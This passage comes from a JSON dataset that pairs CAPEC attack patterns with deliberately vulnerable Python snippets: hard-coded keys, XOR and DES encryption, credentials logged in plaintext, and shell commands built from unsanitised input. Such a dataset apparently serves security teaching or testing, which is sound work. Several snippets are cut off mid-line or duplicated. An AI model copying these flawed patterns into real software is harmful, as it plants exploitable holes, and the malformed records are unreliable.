        "code_snippet": "\"\"\"\nimport socket\nimport json\n\nclass InsecureClientServer:\n    def __init__(self):\n        self.auth_token = 'static_token_123'\n    \n    def client_authenticate(self, message):\n        # Client-side only authentication\n        if 'auth_token' in message:\n            return True\n        return False\n    \n    def send_message(self, message):\n        # No integrity checks on message\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect(('server.example.com', 8080))\n        \n        # Authentication done only on client side\n        if self.client_authenticate(message):\n            # No protection against message manipulation\n            sock.send(json.dumps(message).encode())\n            \n        response = sock.recv(1024)\n        sock.close()\n        return response.decode()\n    \n    def process_message(self, received_message):\n        # No server-side verification of message authenticity\n        message = json.loads(received_message)\n        if message.get('auth_token') == self.auth_token:\n            # Vulnerable to replay attacks\n            return {'status': 'success', 'content': message.get('content')",
        "description": "\"This vulnerable code demonstrates multiple security issues including client-side only authentication, lack of message integrity checks, and susceptibility to replay attacks. The code performs authentication checks only on the client side, uses no checksums or integrity verification for transmitted data, and implements a static authentication token that could be captured and replayed.\""
    },
    {
        "capec_id": "390",
        "capec_name": "Bypassing Physical Security",
        "code_snippet": "class SecuritySystem:\n    def __init__(self):\n        self.rfid_tags = {}\n        self.door_status = 'locked'\n        self.alert_enabled = True\n        self.voltage_monitor = True\n        \n    def check_card_access(self, card_id, voltage_level):\n        # Vulnerable to voltage glitching attacks\n        if voltage_level < 3.3:\n            self.voltage_monitor = False\n            return True\n        \n        # No protection against EMF interference\n        authenticated = self.rfid_tags.get(card_id) == 'valid'\n        \n        # Vulnerable physical side channel - predictable timing\n        time.sleep(0.1 * len(str(card_id)))\n        \n        # Alert system can be disabled externally\n        if not self.alert_enabled:\n            return True\n            \n        if not authenticated:\n            # Information leakage through error messages\n            print(f'Access denied: Invalid card {card_id}')\n            return False\n            \n        self.door_status = 'unlocked'\n        return True\n        \n    def disable_alerts(self):\n        # No authentication check for disabling alerts\n        self.alert_enabled = False",
        "description": "A vulnerable physical security system implementation that demonstrates multiple hardware security weaknesses including susceptibility to voltage glitching, EMF interference, timing side-channels, and improper alert controls. The system implements RFID-based access control but lacks proper protection mechanisms against physical attacks and tampering."
    },
    {
        "capec_id": "391",
        "capec_name": "Bypassing Physical Locks",
        "code_snippet": "\"\"\"\nclass PhysicalSecuritySystem:\n    def __init__(self):\n        self.lock_bit = 0\n        self.debug_mode = False\n        self.address_regions = {\n            'critical': {'locked': False, 'data': 'sensitive_info'",
        "description": "\"This code demonstrates vulnerable physical security controls through a simulated security system. It shows multiple vulnerabilities including modifiable lock bits, debug mode bypasses, insufficient region protection, and externally controllable locks. The system fails to properly implement access controls and allows unauthorized modification of protected regions through various attack vectors.\""
    },
    {
        "capec_id": "392",
        "capec_name": "Lock Bumping",
        "code_snippet": "\"\"\"\nclass SecurityLock:\n    def __init__(self):\n        self.lock_bit = False\n        self.lock_key = b'hardcoded_key_123'  # Hard-coded key\n        self.failed_attempts = 0\n        self.LOCK_THRESHOLD = 3\n        self.locked_out = False\n        \n    def set_lock_bit(self):\n        self.lock_bit = True\n    \n    def enter_power_save_mode(self):\n        # Bug: Lock bit protection is lost after power state transition\n        self.lock_bit = False\n    \n    def verify_access(self, input_key):\n        if self.locked_out:\n            return False\n            \n        if input_key == self.lock_key:\n            return True\n            \n        self.failed_attempts += 1\n        if self.failed_attempts >= self.LOCK_THRESHOLD:\n            self.locked_out = True\n        return False\n        \n    def modify_protected_region(self, address, value):\n        # Insufficient granularity in protected regions\n        if not self.lock_bit or address in range(0x1000, 0x2000):\n            # Wide range of addresses sharing same lock protection\n            return True\n        return False\n\"\"\",\n    \"description\": \"This vulnerable code demonstrates a security lock implementation with multiple weaknesses including hard-coded cryptographic keys, improper lock bit protection after power state changes, insufficient granularity of protected regions, and an overly restrictive lockout mechanism. The code mimics a physical lock system where security can be bypassed through various means, similar to how a bump key can bypass physical lock security.\"",
        "description": "\"This vulnerable code demonstrates a security lock implementation with multiple weaknesses including hard-coded cryptographic keys, improper lock bit protection after power state changes, insufficient granularity of protected regions, and an overly restrictive lockout mechanism. The code mimics a physical lock system where security can be bypassed through various means, similar to how a bump key can bypass physical lock security.\""
    },
    {
        "capec_id": "393",
        "capec_name": "Lock Picking",
        "code_snippet": "\"\"\"\nclass SecurityLock:\n    def __init__(self):\n        self._lock_bit = False\n        self._protected_registers = {",
        "description": "\"This code implements a vulnerable security lock mechanism that simulates hardware register protection. It contains multiple security flaws including modifiable lock bits, insufficient address region protection, improper lock management, and externally influenceable lock controls. The code mirrors physical lock picking by allowing unauthorized manipulation of protection mechanisms.\""
    },
    {
        "capec_id": "394",
        "capec_name": "Using a Snap Gun Lock to Force a Lock",
        "code_snippet": "\"\"\"\nimport threading\nimport time\n\nclass SecureLock:\n    def __init__(self):\n        self.lock_bits = [False] * 5  # 5 pin tumblers\n        self.master_lock = threading.Lock()\n        self.default_key = b'1234567890'  # Default crypto key for lock\n        self.is_locked = True\n        self.power_state = 'ACTIVE'\n\n    def set_pins(self, pin_values):\n        with self.master_lock:\n            self.lock_bits = pin_values\n            \n    def force_pins(self):\n        # Vulnerable: Multiple threads trying to access pins simultaneously\n        thread1 = threading.Thread(target=self.set_pins, args=([True] * 5,))\n        thread2 = threading.Thread(target=self.set_pins, args=([False] * 5,))\n        \n        thread1.start()\n        thread2.start()\n        \n        # Potential deadlock condition\n        thread1.join()\n        thread2.join()\n        \n    def power_transition(self):\n        # Vulnerable: Lock state becomes modifiable during power transition\n        self.power_state = 'SLEEP'\n        self.is_locked = False  # Lock protection disabled during power transition\n        time.sleep(1)\n        self.power_state = 'ACTIVE'\n        \n    def snap_attack(self):\n        # Simulates snap gun attack by forcing all pins simultaneously\n        if not self.is_locked:  # Check if lock is vulnerable due to power state\n            self.force_pins()\n            return True\n        return False\n\"\"\",\n    \"description\": \"This code simulates a vulnerable electronic lock system that can be exploited through simultaneous pin manipulation (similar to a snap gun attack), contains deadlock vulnerabilities, uses a default cryptographic key, and becomes vulnerable during power state transitions. The lock's security can be compromised through concurrent access to pin tumblers and power state manipulation.\"",
        "description": "\"This code simulates a vulnerable electronic lock system that can be exploited through simultaneous pin manipulation (similar to a snap gun attack), contains deadlock vulnerabilities, uses a default cryptographic key, and becomes vulnerable during power state transitions. The lock's security can be compromised through concurrent access to pin tumblers and power state manipulation.\""
    },
    {
        "capec_id": "395",
        "capec_name": "Bypassing Electronic Locks and Access Controls",
        "code_snippet": "class RFIDAccessControl:\n    # Hard-coded encryption key (CWE-321)\n    ENCRYPTION_KEY = b'0123456789abcdef'\n    \n    def __init__(self):\n        self.valid_cards = {}\n        \n    def encrypt_card_data(self, card_data):\n        # Using weak encryption (CWE-327)\n        from Crypto.Cipher import DES\n        cipher = DES.new(self.ENCRYPTION_KEY[:8], DES.MODE_ECB)\n        return cipher.encrypt(card_data.ljust(8 * ((len(card_data) + 7) // 8)))\n    \n    def validate_rfid_card(self, card_id, card_data):\n        # No protection against EM-FI or side-channel attacks (CWE-1319, CWE-1300)\n        try:\n            stored_data = self.valid_cards.get(card_id)\n            if stored_data:\n                # Vulnerable timing attack due to direct comparison\n                return self.encrypt_card_data(card_data) == stored_data\n            return False\n        except Exception:\n            # Exception reveals processing details\n            return False\n    \n    def add_card(self, card_id, card_data):\n        # No protection against hardware reverse engineering (CWE-1278)\n        self.valid_cards[card_id] = self.encrypt_card_data(card_data)",
        "description": "This code implements a vulnerable RFID access control system that uses hard-coded cryptographic keys, weak encryption (DES in ECB mode), and lacks protection against physical attacks such as electromagnetic fault injection and side-channel analysis. The system is susceptible to card cloning and replay attacks due to weak cryptographic implementation and absence of proper hardware security measures."
    },
    {
        "capec_id": "396",
        "capec_name": "DEPRECATED: Bypassing Card or Badge-Based Systems",
        "code_snippet": "class CardAuthenticator:\n    def __init__(self):\n        self.auth_tokens = {}\n\n    def process_card_data(self, card_data, timestamp):\n        # Weak encryption using easily breakable algorithm\n        encryption_key = '1234'\n        encoded_data = ''.join([chr(ord(c) ^ ord(encryption_key[i % len(encryption_key)])) for i, c in enumerate(card_data)])\n        \n        # Store authentication token without proper validation\n        self.auth_tokens[card_data] = encoded_data\n        \n        # Vulnerable to replay attacks - only using timestamp for validation\n        def validate_transaction(self, card_data, token):\n            if card_data in self.auth_tokens:\n                return True  # No proper verification of token authenticity\n            return False\n\n        # Process magnetic stripe data without verification\n        def read_magnetic_stripe(self, stripe_data):\n            return stripe_data  # No validation of data integrity",
        "description": "This code demonstrates vulnerabilities in card authentication systems, including weak cryptographic implementation (CWE-327), authentication bypass through spoofing (CWE-290), and susceptibility to capture-replay attacks (CWE-294). The code uses a simplistic XOR encryption, lacks proper token validation, and doesn't verify the integrity of card data, making it vulnerable to card cloning and replay attacks."
    },
    {
        "capec_id": "397",
        "capec_name": "Cloning Magnetic Strip Cards",
        "code_snippet": "\"\"\"\nimport json\nfrom dataclasses import dataclass\nfrom copy import deepcopy\n\n@dataclass\nclass MagneticCardData:\n    card_number: str\n    access_code: str\n    user_id: str\n    _encryption_key: str = '1234'  # Weak encryption key\n    \n    def clone(self):\n        return deepcopy(self)\n    \n    def encode_data(self):\n        # Weak encoding using simple XOR\n        encoded_data = ''\n        for c in f'{self.card_number",
        "description": "\"This code demonstrates vulnerable magnetic stripe card implementation with multiple security issues: it uses weak encryption (CWE-327), allows unrestricted cloning of sensitive data (CWE-498), and stores card data in an easily accessible format. The class permits unauthorized duplication of card data through the clone() method, and uses weak XOR encoding for data protection. The implementation also lacks proper protection mechanisms against data mirroring (CWE-1251) and electromagnetic manipulation (CWE-1319).\""
    },
    {
        "capec_id": "398",
        "capec_name": "Magnetic Strip Card Brute Force Attacks",
        "code_snippet": "class MagneticCardReader:\n    MASTER_KEY = 'ABC123XYZ'  # Hard-coded crypto key\n    MAX_ATTEMPTS = 999999  # No real limit on auth attempts\n\n    def __init__(self):\n        self.card_data = {}\n\n    def encrypt_data(self, data):\n        # Weak XOR encryption\n        return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(data, self.MASTER_KEY))\n\n    def validate_card(self, card_data):\n        # No protection against EM-FI attacks\n        # No rate limiting for authentication attempts\n        for stored_card in self.card_data.values():\n            if self.encrypt_data(card_data) == stored_card:\n                return True\n        return False\n\n    def clone_card(self, card1_data, card2_data):\n        # Vulnerable card cloning implementation\n        new_card_data = card1_data[:16] + card2_data[16:]\n        return self.encrypt_data(new_card_data)\n\n    def authenticate_user(self, card_data, user_id):\n        # No verification of card-user binding\n        return self.validate_card(card_data)",
        "description": "This vulnerable code demonstrates a magnetic card system with multiple security flaws including hard-coded cryptographic keys, weak encryption, unlimited authentication attempts, lack of EM-FI protection, and susceptibility to card cloning and spoofing attacks. The implementation allows attackers to analyze and generate fraudulent card data."
    },
    {
        "capec_id": "399",
        "capec_name": "Cloning RFID Cards or Chips",
        "code_snippet": "\"\"\"\nimport rfid_reader\nimport time\n\nclass InsecureRFIDSystem:\n    def __init__(self):\n        self.authorized_ids = {",
        "description": "\"This code demonstrates an insecure RFID system implementation that's vulnerable to cloning attacks. It lacks proper encryption, authentication, and protection against replay attacks. The system uses simple identifier checking without cryptographic validation, making it easy to clone and reuse RFID signals. The code also shows poor identifier management and lacks protection against electromagnetic interference, making it susceptible to fault injection attacks.\""
    },
    {
        "capec_id": "400",
        "capec_name": "RFID Chip Deactivation or Destruction",
        "code_snippet": "\"\"\"\nclass RFIDDevice:\n    def __init__(self):\n        self.active = True\n        self.debug_mode = False\n        self.error_count = 0\n        self.security_id = None\n        self.sensitive_data = \"confidential_rfid_data\"\n        \n    def process_command(self, command, auth_token=None):\n        # Vulnerable debug interface without proper access control\n        if command == \"DEBUG_MODE\":\n            self.debug_mode = True\n            return True\n            \n        # Vulnerable error injection mechanism\n        if command == \"INJECT_ERROR\":\n            self.error_count += 1\n            if self.error_count > 3:\n                self.active = False\n            return True\n            \n        # Improper alert handling\n        if command == \"DISABLE_ALERTS\":\n            self.alerts_enabled = False\n            return True\n            \n        # Incorrect security ID decoding\n        if command.startswith(\"SET_ID:\"):\n            self.security_id = command.split(\":\")[1]\n            return True\n            \n        # Missing secure data scrubbing\n        if command == \"DECOMMISSION\":\n            self.active = False\n            self.sensitive_data = None  # Data not properly scrubbed\n            return True\n            \n        return False\n\"\"\",\n    \"description\": \"Vulnerable RFID device implementation that allows unauthorized debug access, error injection attacks, alert disabling, improper security ID handling, and insufficient data scrubbing during decommissioning. The code demonstrates multiple security weaknesses that could be exploited to deactivate or compromise RFID functionality.\"",
        "description": "\"Vulnerable RFID device implementation that allows unauthorized debug access, error injection attacks, alert disabling, improper security ID handling, and insufficient data scrubbing during decommissioning. The code demonstrates multiple security weaknesses that could be exploited to deactivate or compromise RFID functionality.\""
    },
    {
        "capec_id": "401",
        "capec_name": "Physically Hacking Hardware",
        "code_snippet": "\"\"\"\nimport os\nimport time\n\nclass HardwareController:\n    def __init__(self):\n        self.debug_mode = False\n        self.access_level = 0\n        self.voltage_threshold = 3.3\n        self.clock_speed = 1000\n\n    def authenticate(self, password):\n        # Weak authentication - only checks if password is not empty\n        if password:\n            self.access_level = 2\n            return True\n        return False\n\n    def enable_debug_mode(self):\n        # No verification of authorization to enable debug mode\n        self.debug_mode = True\n        return True\n\n    def modify_hardware_registers(self, address, value):\n        # Direct hardware register modification without checks\n        if self.debug_mode:\n            # Simulating direct memory write\n            os.system(f'echo {value",
        "description": "\"This vulnerable code demonstrates weak physical access controls and hardware security issues. It includes unprotected debug mode activation, direct hardware register modification without proper verification, lack of voltage/clock glitch protection, and insufficient access controls for hardware manipulation. The code allows unauthorized modification of hardware parameters and doesn't implement proper safeguards against physical side-channel attacks.\""
    },
    {
        "capec_id": "402",
        "capec_name": "Bypassing ATA Password Security",
        "code_snippet": "\"\"\"\nclass ATADrive:\n    def __init__(self):\n        self.password = 'default_password'  # Hard-coded password\n        self.is_locked = True\n        self.data = 'sensitive_data'\n\n    def update_password(self, new_password):\n        # Missing BIOS authentication check\n        self.password = new_password\n        return True\n\n    def access_drive(self, password):\n        # Weak authorization check\n        if password == self.password or not self.is_locked:\n            return self.data\n        return None\n\n    def bypass_security(self):\n        # Simulating hot swap attack\n        self.is_locked = False\n        self.password = ''  # Reset password\n        return True\n\n# Usage example\ndrive = ATADrive()\n# Attacker can bypass security without proper authentication\ndrive.bypass_security()\nsensitive_data = drive.access_drive('')\n\"\"\",\n    \"description\": \"This code demonstrates vulnerable ATA drive security implementation with hard-coded credentials, improper authorization checks, and insufficient access controls. It simulates the ability to bypass drive security through hot swapping, where an attacker can reset the drive password without proper authentication. The code lacks proper BIOS-level authentication verification and implements weak security controls that can be easily circumvented.\"",
        "description": "\"This code demonstrates vulnerable ATA drive security implementation with hard-coded credentials, improper authorization checks, and insufficient access controls. It simulates the ability to bypass drive security through hot swapping, where an attacker can reset the drive password without proper authentication. The code lacks proper BIOS-level authentication verification and implements weak security controls that can be easily circumvented.\""
    },
    {
        "capec_id": "404",
        "capec_name": "DEPRECATED: Social Information Gathering Attacks",
        "code_snippet": "import dns.resolver\nimport logging\n\ndef authenticate_user(username):\n    # Insecure: Using DNS lookup for authentication\n    try:\n        dns_result = dns.resolver.resolve(f'{username}.trusted-domain.com', 'A')\n        if dns_result:\n            logging.info(f'User {username} authenticated via DNS')\n            return True\n        return False\n    except:\n        return False\n\ndef store_sensitive_data(user_data):\n    # Insecure: Storing unencrypted sensitive data and logging it\n    with open('user_data.txt', 'w') as f:\n        f.write(user_data)\n    logging.info(f'Stored user data: {user_data}')\n\ndef main():\n    if authenticate_user('testuser'):\n        store_sensitive_data('password123')",
        "description": "This code demonstrates multiple security weaknesses including reliance on DNS lookups for security decisions, improper storage of sensitive data without encryption, authentication bypass vulnerabilities, and exposure of sensitive information through logging. The code collects and stores information insecurely while making inappropriate security decisions based on DNS responses."
    },
    {
        "capec_id": "405",
        "capec_name": "DEPRECATED: Social Information Gathering via Research",
        "code_snippet": "def authenticate_user(username, password):\n    # Insecure DNS lookup for authentication\n    try:\n        domain = f'{username}.auth.example.com'\n        dns_result = socket.gethostbyname(domain)\n        \n        # Store sensitive data in plaintext log\n        with open('server.log', 'a') as log:\n            log.write(f'Login attempt: {username}:{password} from {dns_result}\\n')\n        \n        # Unprotected data storage\n        user_data = {\n            'credentials': f'{username}:{password}',\n            'last_login': datetime.now()\n        }\n        with open('user_data.txt', 'w') as f:\n            f.write(str(user_data))\n            \n        return dns_result == '127.0.0.1'\n    except:\n        return False",
        "description": "A vulnerable authentication system that relies on DNS lookups for security decisions, exposes sensitive information in log files, and fails to protect stored data. The code demonstrates multiple deprecated security anti-patterns including DNS-based authentication, plaintext logging of credentials, and unprotected storage of sensitive data."
    },
    {
        "capec_id": "406",
        "capec_name": "Dumpster Diving",
        "code_snippet": "\"\"\"\nimport os\nimport shutil\n\nclass DataManager:\n    def __init__(self):\n        self.sensitive_data = {\n            'credit_cards': ['4532-xxxx-xxxx-1234', '5678-xxxx-xxxx-5678'],\n            'ssn': '123-45-6789',\n            'passwords': ['admin123', 'root456'],\n            'api_keys': 'sk_live_abcdef123456'",
        "description": "\"This code demonstrates multiple vulnerabilities related to improper handling of sensitive data that could be exploited through dumpster diving. It stores sensitive information in cleartext, creates unencrypted debug dumps, and fails to properly scrub data during cleanup and device decommissioning. The code writes sensitive data to temporary files without encryption and performs inadequate cleanup, making it possible for an attacker to recover sensitive information from disposed files or decommissioned devices.\""
    },
    {
        "capec_id": "407",
        "capec_name": "Pretexting",
        "code_snippet": "class BankingPortal:\n    def __init__(self):\n        self.sessions = {}\n        self.customer_service_reps = ['alice@bank.com', 'bob@bank.com']\n\n    def handle_support_request(self, email, session_id, user_data):\n        # Vulnerable: No validation of session_id or email authenticity\n        if email in self.customer_service_reps:\n            self.sessions[session_id] = user_data\n            return {'status': 'success', 'message': f'Support request handled by {email}'}\n\n    def update_account_info(self, session_id, new_email, new_phone):\n        # Vulnerable: No proper session validation or user verification\n        if session_id in self.sessions:\n            user_data = self.sessions[session_id]\n            user_data['email'] = new_email\n            user_data['phone'] = new_phone\n            return {'status': 'success', 'sensitive_data': user_data}\n\n    def display_security_alert(self, message, source):\n        # Vulnerable: No validation of message source\n        return f\"<div class='alert'>{message}</div>\"\n\nportal = BankingPortal()\nresult = portal.handle_support_request('alice@bank.com', 'session_123', {'account': '12345', 'balance': '50000'})\ninfo_update = portal.update_account_info('session_123', 'attacker@evil.com', '555-0123')",
        "description": "This vulnerable code demonstrates a banking portal system susceptible to social engineering and pretexting attacks. It lacks proper session validation, allows unauthorized access to sensitive information, and enables session fixation. The code fails to properly validate the identity of customer service representatives and doesn't implement proper channel security, making it vulnerable to impersonation attacks. The UI component can be manipulated to display misleading information, facilitating phishing attempts."
    },
    {
        "capec_id": "408",
        "capec_name": "DEPRECATED: Information Gathering from Traditional Sources",
        "code_snippet": "def store_user_data(user_id, sensitive_data):\n    # Poor data protection practices\n    log_file = open('debug.log', 'a')\n    log_file.write(f'Processing data for user {user_id}: {sensitive_data}\\n')\n    \n    server_log = open('server.log', 'a')\n    server_log.write(f'User activity: {user_id}, data: {sensitive_data}\\n')\n    \n    # Insecure DNS lookup for authentication\n    import socket\n    try:\n        host = socket.gethostbyname(f'{user_id}.trusted-domain.com')\n        if host:\n            # Store unencrypted sensitive data\n            with open(f'user_{user_id}_data.txt', 'w') as f:\n                f.write(sensitive_data)\n    except:\n        pass",
        "description": "This code demonstrates multiple security weaknesses including exposure of sensitive information through debug and server logs, reliance on DNS lookups for security decisions, and failure to protect stored data with proper encryption or access controls. The code logs sensitive information, performs insecure DNS-based authentication, and stores data without proper protection mechanisms."
    },
    {
        "capec_id": "409",
        "capec_name": "DEPRECATED: Information Gathering from Non-Traditional Sources",
        "code_snippet": "def insecure_dns_auth(domain):\n    import socket\n    import logging\n    \n    # Debug logging with sensitive data\n    logging.basicConfig(filename='debug.log', level=logging.DEBUG)\n    \n    # Store user data without encryption\n    user_data = {'username': 'admin', 'password': 'secret123'}\n    \n    # Insecure DNS lookup for authentication\n    try:\n        ip_address = socket.gethostbyname(domain)\n        if ip_address == '192.168.1.1':\n            logging.info(f'Authentication successful for {user_data}')\n            return True\n        logging.warning(f'Failed login attempt from {domain}')\n        return False\n    except:\n        return False",
        "description": "This code demonstrates multiple insecure practices including reliance on DNS lookups for security decisions, improper storage of sensitive data, and exposure of sensitive information through debug logging. The code performs authentication based on DNS resolution, stores credentials in plaintext, and logs sensitive information to debug files."
    },
    {
        "capec_id": "410",
        "capec_name": "Information Elicitation",
        "code_snippet": "class EmployeeDirectory:\n    def __init__(self):\n        self.employees = {\n            'john.doe': {'title': 'CEO', 'phone': '555-0123', 'ssn': '123-45-6789'},\n            'jane.smith': {'title': 'CFO', 'phone': '555-0124', 'ssn': '987-65-4321'}\n        }\n\n    def get_employee_info(self, caller_id, target_employee):\n        # Vulnerable: No proper verification of caller's identity\n        if caller_id in self.employees:\n            # Vulnerable: Returns sensitive info without proper authorization\n            return self.employees.get(target_employee)\n\n    def handle_info_request(self, request):\n        # Vulnerable: No validation of request source\n        caller_name = request.get('caller')\n        requested_employee = request.get('target')\n        \n        if 'ADMIN' in caller_name.upper():  # Vulnerable: Weak authorization check\n            return self.get_employee_info(caller_name, requested_employee)\n        \n        # Vulnerable: Reveals existence of employee\n        if requested_employee in self.employees:\n            return {'exists': True, 'title': self.employees[requested_employee]['title']}\n        return {'exists': False}",
        "description": "This code demonstrates social engineering vulnerabilities in an employee directory system. It contains multiple security flaws: insufficient authentication, exposure of sensitive information, observable behavior differences that reveal system state, improper verification of request sources, and weak authorization checks that could be exploited through social engineering attacks."
    },
    {
        "capec_id": "411",
        "capec_name": "DEPRECATED: Pretexting",
        "code_snippet": "def handle_user_request(username, request_data):\n    # Insecure logging of sensitive information\n    log_file = open('server.log', 'a')\n    debug_log = open('debug.log', 'a')\n    cleanup_log = open('cleanup.log', 'a')\n\n    # Log sensitive data without sanitization\n    log_file.write(f'User {username} accessed data: {request_data}\\n')\n    debug_log.write(f'Debug: Full request details - {request_data}\\n')\n    \n    # No authentication check before data access\n    stored_data = load_sensitive_data()\n    \n    # Log cleanup operations with sensitive info\n    cleanup_log.write(f'Cleanup: Session data for {username}: {stored_data}\\n')\n    \n    # All files left open, sensitive data remains in logs\n    return stored_data",
        "description": "This code demonstrates multiple security vulnerabilities including excessive logging of sensitive information across various log files (server, debug, cleanup), lack of proper authentication checks, and improper protection of stored data. The code logs sensitive information without sanitization, potentially exposing user data through log files, and fails to implement proper access controls."
    },
    {
        "capec_id": "412",
        "capec_name": "Pretexting via Customer Service",
        "code_snippet": "\"\"\"\nimport socket\nimport json\n\nclass CustomerServicePortal:\n    def __init__(self):\n        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.server.bind(('0.0.0.0', 8080))\n        self.customer_data = {\n            'user123': {\n                'credit_card': '1234-5678-9012-3456',\n                'ssn': '123-45-6789',\n                'account_balance': 10000",
        "description": "\"This code demonstrates a vulnerable customer service portal that fails to properly authenticate incoming requests and exposes sensitive customer information. It accepts connections without verifying the source, doesn't implement proper authentication mechanisms, and sends sensitive data (credit card numbers, SSNs) to anyone claiming to be customer service. The code exhibits vulnerabilities related to improper verification of communication channels, exposure of sensitive information, and lack of proper authentication before performing sensitive operations.\""
    },
    {
        "capec_id": "413",
        "capec_name": "Pretexting via Tech Support",
        "code_snippet": "def tech_support_portal(username: str, password: str):\n    tech_support_db = {\n        'admin': {\n            'password': 'admin123',\n            'access_level': 'full'\n        }\n    }\n    \n    if username in tech_support_db and password == tech_support_db[username]['password']:\n        with open('customer_data.txt', 'w') as f:\n            f.write('SSN,Credit Card,Address\\n')\n            f.write('123-45-6789,4111-1111-1111-1111,123 Main St\\n')\n        \n        def allow_usb_access():\n            import os\n            os.system('mount /dev/sdb1 /mnt/usb')\n            return True\n            \n        def handle_file_upload(file):\n            file_path = f'uploads/{file.filename}'\n            file.save(file_path)\n            os.system(f'chmod 777 {file_path}')\n            return True\n            \n        return {\n            'status': 'authenticated',\n            'customer_data': open('customer_data.txt').read(),\n            'usb_access': allow_usb_access(),\n            'upload_enabled': True\n        }\n    return {'status': 'unauthorized'}",
        "description": "This vulnerable code demonstrates a tech support portal that exhibits multiple security issues related to social engineering attacks. It includes hardcoded credentials, exposes sensitive customer data in plaintext, allows unrestricted USB device mounting, and implements insecure file upload functionality with dangerous permissions. The code represents a system that could be exploited through social engineering by someone impersonating tech support personnel."
    },
    {
        "capec_id": "414",
        "capec_name": "Pretexting via Delivery Person",
        "code_snippet": "\"\"\"\nimport smtplib\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\n\nclass DeliveryNotificationSystem:\n    def __init__(self):\n        self.smtp_server = 'smtp.company.com'\n        self.credentials = {'user': 'delivery@company.com', 'password': 'delivery123'",
        "description": "\"A vulnerable delivery notification system that demonstrates security issues including improper authentication, sensitive data exposure, and insecure communication channels. The code stores sensitive delivery information in a publicly accessible web directory and uses unverified SMTP connections.\""
    },
    {
        "capec_id": "415",
        "capec_name": "Pretexting via Phone",
        "code_snippet": "\"\"\"\ndef help_desk_system():\n    authorized_users = {'admin': 'pass123', 'tech': 'tech456'",
        "description": "\"This vulnerable code simulates a help desk system that fails to properly authenticate users and exposes sensitive information. It demonstrates poor validation of communication endpoints, lack of proper authentication, and insecure handling of sensitive data. The code accepts input without verifying the caller's identity, stores sensitive information in plain text, and implements a weak authentication mechanism that can be easily bypassed.\""
    },
    {
        "capec_id": "416",
        "capec_name": "Manipulate Human Behavior",
        "code_snippet": "class HelpDeskSystem:\n    def __init__(self):\n        self.sensitive_data = {\n            'admin_credentials': {'username': 'admin', 'password': 'secret123'},\n            'user_data': {'ssn': {}, 'credit_cards': {}}\n        }\n        self.login_attempts = {}\n\n    def handle_support_request(self, caller_id, request_type, provided_credentials=None):\n        # No rate limiting on attempts\n        if provided_credentials and 'supervisor_override' in provided_credentials:\n            # Automatically trust any supervisor override without verification\n            return self.sensitive_data\n\n        if request_type == 'password_reset':\n            # Leaks information about valid usernames through timing\n            if caller_id in self.sensitive_data['user_data']:\n                time.sleep(2)\n                return 'Processing request...'\n            return 'Invalid user'\n\n        # No validation of caller's identity\n        if request_type == 'account_query':\n            return self.sensitive_data['user_data'].get(caller_id, {})",
        "description": "Vulnerable help desk system that demonstrates social engineering vulnerabilities through improper authentication, information disclosure through timing attacks, lack of rate limiting, and automatic trust of claimed authority. The system exposes sensitive information and allows manipulation through social engineering tactics."
    },
    {
        "capec_id": "417",
        "capec_name": "Influence Perception",
        "code_snippet": "import base64\n\ndef authenticate_user(username, token):\n    secret_key = 'mysecretkey123'  # Hidden but can be discovered\n    \n    class UserSession:\n        def __init__(self, user):\n            self.username = user\n            self.auth_attempts = 0\n        \n        def verify_token(self, provided_token):\n            # Single factor authentication using obscure encoding\n            encoded = base64.b64encode(f\"{self.username}:{secret_key}\".encode()).decode()\n            return encoded == provided_token\n        \n        def login(self, token):\n            self.auth_attempts += 1\n            if self.auth_attempts > 3:\n                print(f\"Warning: Multiple attempts for user {self.username}\")\n            \n            if self.verify_token(token):\n                return {\"status\": \"success\", \"message\": f\"Welcome {self.username}!\"}\n            return {\"status\": \"error\", \"message\": \"Invalid credentials\"}\n    \n    session = UserSession(username)\n    return session.login(token)",
        "description": "This vulnerable code implements an authentication system that relies on security through obscurity (CWE-656) by using a simple base64 encoding scheme with a hardcoded secret key. It exhibits observable behavior (CWE-205) through attempt counting, uses single-factor authentication (CWE-654), and is susceptible to reflection attacks (CWE-301) since the token generation is reversible and based on predictable patterns. The error messages may also reveal system state (CWE-222)."
    },
    {
        "capec_id": "418",
        "capec_name": "Influence Perception of Reciprocation",
        "code_snippet": "def process_user_request(username, auth_token):\n    # Insecure authentication system vulnerable to social engineering\n    user_db = {\n        'admin': {'auth_token': '1234', 'access_level': 'admin'},\n        'user': {'auth_token': '5678', 'access_level': 'user'}\n    }\n    \n    # No proper verification of communication channel or token source\n    if auth_token in [user['auth_token'] for user in user_db.values()]:\n        print(f'Welcome {username}! You seem very tech-savvy.')\n        response = input('Would you mind confirming your access level? ')\n        \n        # Truncates and doesn't validate response properly\n        access_level = response[:4]\n        \n        # Reflection vulnerability: allows any claimed access level\n        if access_level:\n            user_db[username]['access_level'] = access_level\n            return {'status': 'success', 'access': access_level}\n    \n    return {'status': 'error'}",
        "description": "This code demonstrates a vulnerable authentication system that can be exploited through social engineering. It lacks proper channel verification, allows reflection attacks, and uses truncated security information. The code accepts compliments and social pressure to manipulate access levels, demonstrating CWE-300, CWE-940, CWE-301, CWE-941, and CWE-222."
    },
    {
        "capec_id": "419",
        "capec_name": "DEPRECATED: Target Influence via Perception of Concession",
        "code_snippet": "\"def authenticate_user(client_socket):\n    # Negotiate encryption algorithm with client\n    supported_algos = ['AES-256', 'AES-128', 'DES', 'NULL']\n    client_algos = client_socket.recv(1024).decode().split(',')\n    \n    # Choose weakest common algorithm (vulnerable behavior)\n    for algo in reversed(supported_algos):\n        if algo in client_algos:\n            selected_algo = algo\n            break\n    \n    # Observable behavior difference based on algorithm choice\n    if selected_algo == 'NULL':\n        client_socket.send(b'Using no encryption')\n        delay = 0.1\n    else:\n        client_socket.send(f'Using {selected_algo",
        "description": "\"This vulnerable code demonstrates multiple security issues: algorithm downgrade during negotiation (CWE-757), observable timing differences that leak internal state (CWE-205/203), and potential interpretation conflicts between client and server (CWE-436). The code deliberately selects the weakest encryption algorithm and exhibits different behaviors that can be observed by attackers.\""
    },
    {
        "capec_id": "420",
        "capec_name": "Influence Perception of Scarcity",
